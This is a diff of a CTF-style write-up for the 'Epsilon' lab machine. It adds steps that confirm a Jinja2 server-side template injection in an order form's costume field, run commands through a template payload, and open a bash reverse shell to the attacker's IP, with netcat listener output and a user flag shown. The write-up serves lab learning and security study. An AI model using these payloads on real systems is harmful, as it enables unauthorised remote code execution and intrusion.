@@ -663,7 +663,9 @@ After clicking on the `Order` link in the navigation menu, the following form is
 
 <br />
 
-To test the functionality, we select another Costume, fill all the fields, and click the `"order"` button:
+To test the functionality, we select a different `costume`, fill in all the fields, and click the `"Order"` button:
+
+
 
 <br />
 
@@ -673,9 +675,9 @@ To test the functionality, we select another Costume, fill all the fields, and c
 
 As we can see, the value of the `costume` field is reflected in the output.
 
-This is promising, because if we can manipulate this field, we may be able to test for a potential `STTI`.
+This is promising, because if we can manipulate this field, we may be able to exploit a potential `SSTI` vulnerability.
 
-For example, submitting `{{7*7}}` in the `Costume` field should render `49` in the confirmation message if SSTI is present.
+For instance, submitting `{{7*7}}` in the `Costume` field should render `49` in the confirmation message if SSTI is present.
 
 To test this, we intercept the request using Burp Suite:
 
@@ -685,7 +687,7 @@ To test this, we intercept the request using Burp Suite:
 
 <br />
 
-Once the request is intercepted, we simply modify the costume field to submit the payload `{{7*7}}`.
+Once the request is intercepted, we simply modify the `costume` field to inject the payload `{{7*7}}`.
 
 And if we check the output...
 
@@ -699,7 +701,7 @@ Great! The result of the expression is reflected in the response.
 
 This confirms that the application is vulnerable to `SSTI`.
 
-After a time teting `Jinja2` payloads, I find one in [Payloads All The Things] that allow us to run a command:
+After some time testing `Jinja2` payloads, I find one in [Payloads All The Things] that allow us to run a command:
 
 <br />
 
@@ -707,5 +709,54 @@ After a time teting `Jinja2` payloads, I find one in [Payloads All The Things] t
 {{ joiner.__init__.__globals__.os.popen('id').read() }}
 ```
 ![10](../../../assets/images/Epsilon/10.png)
+
+<br />
+
+We can now execute commands on the server as the `tom` user.
+
+At this point, we can launch a `reverse shell` to gain full access to the system:
+
+<br />
+
+```python 
+{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >%26 /dev/tcp/10.10.14.6/443 0>%261"').read() }}
+```
+
+<br />
+
+We need to `URL-encode` the ampersand `(&)` as it would otherwise break the request.
+
+Once the request is submitted, we can check our listener:
+
+<br />
+
+```bash
+❯ nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.11.134] 38060
+bash: cannot set terminal process group (956): Inappropriate ioctl for device
+bash: no job control in this shell
+tom@epsilon:/var/www/app$ id
+id
+uid=1000(tom) gid=1000(tom) groups=1000(tom)
+```
+
+<br />
+
+We now have a shell as the `tom` user.
+
+Now, we can retrieve the `user.txt` flag:
+
+<br />
+
+```bash
+tom@epsilon:/$ cd /home/tom
+tom@epsilon:~$ cat user.txt
+fabadbf5cf23291b89cb14f093xxxxxx
+```
+
+<br />
+
+# Privilege Escalation: tom -> root
 
 <br />
